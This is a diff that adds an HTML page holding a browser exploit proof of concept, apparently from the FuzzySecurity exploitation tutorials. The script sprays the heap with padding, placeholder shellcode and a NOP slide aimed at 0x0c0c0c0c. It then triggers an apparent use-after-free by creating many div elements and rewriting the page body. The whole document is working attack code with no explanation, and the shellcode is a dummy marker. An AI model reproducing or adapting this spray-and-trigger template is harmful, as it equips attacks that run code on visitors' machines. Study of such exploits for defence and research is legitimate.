@@ -1,0 +1,86 @@
+<!doctype html>
+<html>
+<head>
+<script>
+ 
+    //Fix BSTR spec
+    function alloc(bytes, mystr) {
+        while (mystr.length<bytes) mystr += mystr;
+        return mystr.substr(0, (bytes-6)/2);
+    }
+     
+    block_size = 0x1000;
+    padding_size = 0x5F4; //0x5FA => offset 0x1000 hex block to 0x0c0c0c0c
+    Padding = '';
+    NopSlide = '';
+     
+    var Shellcode = unescape(
+    '%u4141%u4141'+
+    '%u4141%u4141'+
+    '%u4141%u4141'+
+    '%u4141%u4141'+
+    '%u4141%u4141'+
+    '%u4141%u4141'+
+    '%u4141%u4141'+
+    '%u4141%u4141'+
+    '%u4141%u4141'+
+    '%u4141%u4141'+
+    '%u4141%u4141'+
+    '%u4141%u4141'+
+    '%u4141%u4141'+   // Padding 0x70 hex!
+    '%u4141%u4141'+
+    '%u4141%u4141'+
+    '%u4141%u4141'+
+    '%u4141%u4141'+
+    '%u4141%u4141'+
+    '%u4141%u4141'+
+    '%u4141%u4141'+
+    '%u4141%u4141'+
+    '%u4141%u4141'+
+    '%u4141%u4141'+
+    '%u4141%u4141'+
+    '%u4141%u4141'+
+    '%u4141%u4141'+
+    '%u4141%u4141'+
+    '%u4141%u4141'+
+    '%u7546%u7a7a%u5379'+   // ASCII
+    '%u6365%u7275%u7469'+   // FuzzySecurity
+    '%u9079');
+     
+    for (p = 0; p < padding_size; p++){ 
+    Padding += unescape('%ub33f');}
+     
+    for (c = 0; c < block_size; c++){ 
+    NopSlide += unescape('%u9090');}
+    NopSlide = NopSlide.substring(0,block_size - (Shellcode.length + Padding.length));
+     
+    var OBJECT = Padding + Shellcode + NopSlide;
+    OBJECT = alloc(0xfffe0, OBJECT); // 0xfffe0 = 1mb
+     
+    var evil = new Array();
+    for (var k = 0; k < 150; k++) {
+        evil[k] = OBJECT.substr(0, OBJECT.length);
+    }
+  
+    var data;
+    var objArray = new Array(1150);
+   
+    setTimeout(function(){
+    document.body.style.whiteSpace = "pre-line";
+   
+    //CollectGarbage();
+   
+        for (var i=0;i<1150;i++){
+            objArray[i] = document.createElement('div');
+            objArray[i].className = data += unescape("%u0c0c%u0c0c");
+        }
+   
+        setTimeout(function(){document.body.innerHTML = "boo"}, 100)
+        }, 100)
+   
+</script>
+</head>
+<body>
+<p> </p>
+</body>
+</html>
